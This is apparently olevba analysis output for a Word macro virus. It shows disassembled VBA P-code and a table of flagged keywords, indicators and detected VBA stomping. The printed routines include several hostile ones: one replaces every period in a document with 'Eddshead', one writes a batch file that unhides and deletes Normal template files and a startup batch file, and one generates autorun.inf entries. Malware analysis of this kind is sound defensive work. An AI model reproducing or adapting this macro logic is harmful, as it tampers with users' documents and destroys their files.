' Line #173:
' 	EndSub 
' Line #174:
' 	FuncDefn (Sub p3283())
' Line #175:
' 	OnError (Resume Next) 
' Line #176:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #177:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #178:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #179:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #180:
' 	LitStr 0x0001 "."
' 	MemStWith Then 
' Line #181:
' 	LitStr 0x0008 "Eddshead"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #182:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #183:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #184:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #185:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #186:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #187:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #188:
' 	EndWith 
' Line #189:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #190:
' 	EndSub 
' Line #191:
' Line #192:
' 	FuncDefn (Sub vBitchES(strFile As String))
' Line #193:
' Line #194:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #195:
' 	OnError (Resume Next) 
' Line #196:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #197:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #198:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #199:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #200:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #201:
' 	Ld Friend 
' 	St hFile 
' Line #202:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #204:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #208:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	Add 
' 	PrintItemNL 
' Line #210:
' 	Ld hFile 
' 	Close 0x0001 
' Line #211:
' 	EndSub 
' Line #212:
' 	FuncDefn (Sub dhIconDisco(strFile As String))
' Line #213:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #214:
' 	OnError (Resume Next) 
' Line #215:
' 	ArgsCall Read 0x0000 
' Line #216:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St Choice 
' Line #217:
' 	Ld Rnd 
' 	LitDI2 0x0042 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St rnn$ 
' Line #218:
' 	Ld Rnd 
' 	LitDI2 0x001B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rn$ 
' Line #219:
' 	LitStr 0x0009 "[autorun]"
' 	St Part1$ 
' Line #220:
' 	LitStr 0x0024 "icon = c:\windows\system\pifmgr.dll,"
' 	St Part2$ 
' Line #221:
' 	LitStr 0x0025 "icon = c:\windows\SYSTEM\shell32.dll,"
' 	St Part22$ 
' Line #222:
' 	Ld Part2$ 
' 	Ld rn$ 
' 	Add 
' 	St Part3$ 
' Line #223:
' 	Ld Part22$ 
' 	Ld rnn$ 
' 	Add 
' 	St Part33$ 
' Line #224:
' 	Ld Friend 
' 	St hFile 
' Line #225:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #226:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #227:
' 	Ld Choice 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part3$ 
' 	PrintItemNL 
' Line #229:
' 	ElseBlock 
' Line #230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #231:
' 	EndIfBlock 
' Line #232:
' 	Ld hFile 
' 	Close 0x0001 
' Line #233:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

